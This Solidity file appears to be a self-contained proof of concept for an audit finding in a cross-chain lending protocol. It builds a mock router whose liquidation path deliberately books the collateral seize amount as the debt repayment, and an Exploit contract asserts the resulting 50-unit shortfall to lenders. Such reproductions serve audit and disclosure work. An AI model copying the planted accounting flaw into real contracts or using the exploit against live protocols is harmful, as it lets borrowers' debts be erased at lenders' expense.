// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — cross-chain liquidation reduces debt by seizeTokens (Sherlock H-19, issue 836)
    SYNTHETIC, cheatcode-free reduction. The LayerZero hop is an in-process _send of the
    same Payload.amount the router would encode. _handleLiquidationExecute forwards
    payload.amount (the seize) and repayCrossChainBorrowInternal books it as the repay. */

contract MockERC20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CrossChainRouter {
    uint256 public constant PROTOCOL_SEIZE_SHARE_MANTISSA = 0.1 ether;
    uint8 internal constant LIQUIDATION_EXECUTE = 1;
    uint8 internal constant LIQUIDATION_SUCCESS = 2;

    MockERC20 public immutable debtToken;
    MockERC20 public immutable collateral;
    address public borrower;
    address public liquidator;
    uint256 public borrowerDebt;
    uint256 public debtReducedBy;
    uint256 public cashIn;
    uint256 public seizedForLiquidator;

    constructor(MockERC20 _debt, MockERC20 _collateral, address _borrower) {
        debtToken = _debt;
        collateral = _collateral;
        borrower = _borrower;
        borrowerDebt = 200 ether;
    }

    function liquidate(uint256 repayAmount) external {
        liquidator = msg.sender;
        cashIn = repayAmount;
        debtToken.transferFrom(msg.sender, address(this), repayAmount);
        uint256 seizeTokens = repayAmount * 150 / 100;
        _executeLiquidationCore(repayAmount, seizeTokens);
    }

    function _executeLiquidationCore(uint256 repayAmount, uint256 seizeTokens) internal {
        // Chain B tells Chain A how much collateral to seize. That part is the seize, correctly.
        _send(seizeTokens, LIQUIDATION_EXECUTE, repayAmount);
    }

    function _handleLiquidationExecute(uint256 amount, uint256 repayAmount) internal {
        uint256 protocolSeizeShare = amount * PROTOCOL_SEIZE_SHARE_MANTISSA / 1e18;
        require(protocolSeizeShare < amount, "Invalid protocol share");
        uint256 liquidatorShare = amount - protocolSeizeShare;
        collateral.transfer(liquidator, liquidatorShare);
        seizedForLiquidator = liquidatorShare;
        _send(amount, LIQUIDATION_SUCCESS, repayAmount); // @> VULN: success payload reuses the seize amount. FIX: send repayAmount.
    }

    function _handleLiquidationSuccess(uint256 amount) internal {
        repayCrossChainBorrowInternal(borrower, liquidator, amount);
    }

    function repayCrossChainBorrowInternal(address, address, uint256 amount) internal {
        borrowerDebt -= amount;
        debtReducedBy = amount;
    }

    function _send(uint256 amount, uint8 kind, uint256 repayAmount) internal {
        if (kind == LIQUIDATION_EXECUTE) {
            _handleLiquidationExecute(amount, repayAmount);
        } else {
            _handleLiquidationSuccess(amount);
        }
    }
}

contract Exploit {
    MockERC20 public debt; // nonce 1
    MockERC20 public collateral; // nonce 2
    CrossChainRouter public router; // nonce 3

    constructor() {
        debt = new MockERC20("DEBT");
        collateral = new MockERC20("COL");
        router = new CrossChainRouter(debt, collateral, address(0xB0B));
    }

    function run() external {
        debt.mint(address(this), 100 ether);
        collateral.mint(address(router), 150 ether);
        debt.approve(address(router), 100 ether);
        router.liquidate(100 ether);
        // Debt falls by the 150 seize, not the 100 repay. Lenders are short 50.
        require(router.cashIn() == 100 ether, "cash");
        require(router.debtReducedBy() == 150 ether, "reduced by seize");
        require(router.borrowerDebt() == 50 ether, "debt left");
        require(router.debtReducedBy() - router.cashIn() == 50 ether, "gap");
        require(router.seizedForLiquidator() == 135 ether, "seize");
        require(collateral.balanceOf(address(this)) == 135 ether, "liquidator col");
    }

    function gap() external view returns (uint256) {
        return router.debtReducedBy() - router.cashIn();
    }
}
